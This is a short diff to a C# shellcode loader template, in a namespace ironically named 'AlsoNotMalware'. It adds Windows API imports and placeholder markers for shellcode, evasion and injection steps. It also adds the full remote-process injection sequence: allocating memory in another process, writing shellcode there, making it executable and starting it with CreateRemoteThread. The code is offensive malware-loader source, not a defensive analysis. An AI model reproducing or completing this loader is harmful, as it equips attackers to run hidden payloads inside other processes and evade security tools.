@@ -62,6 +62,7 @@ namespace AlsoNotMalware
         public const uint DetachedProcess = 0x00000008;
         public const uint CreateNoWindow = 0x08000000;
 
+
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
         private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);
 
@@ -77,9 +78,35 @@ namespace AlsoNotMalware
         [DllImport("kernel32.dll")]
         static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
+        [DllImport("kernel32.dll")]
+        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+            
+        private const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
+
         static void Main(string[] args)
         {
+            //####EVASION####
+            byte[] buf = new byte[####SHELLCODE_LEN####] ####SHELLCODE####;
+
+            //####CALL####
+
+            //####INJECTION####
             
+            // Allocate RW space for shellcode in target process
+            IntPtr lpBaseAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x3000, PageReadWrite);
+
+            // Copy shellcode to target process
+            IntPtr outSize;
+            WriteProcessMemory(hProcess, lpBaseAddress, buf, buf.Length, out outSize);
+
+            // Change memory protection to executable
+            uint lpflOldProtect;
+            VirtualProtectEx(hProcess, lpBaseAddress, (uint)buf.Length, PageReadExecute, out lpflOldProtect);
+
+            // Create remote thread in target process
+            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, lpBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
+
+
         }
     }
 }
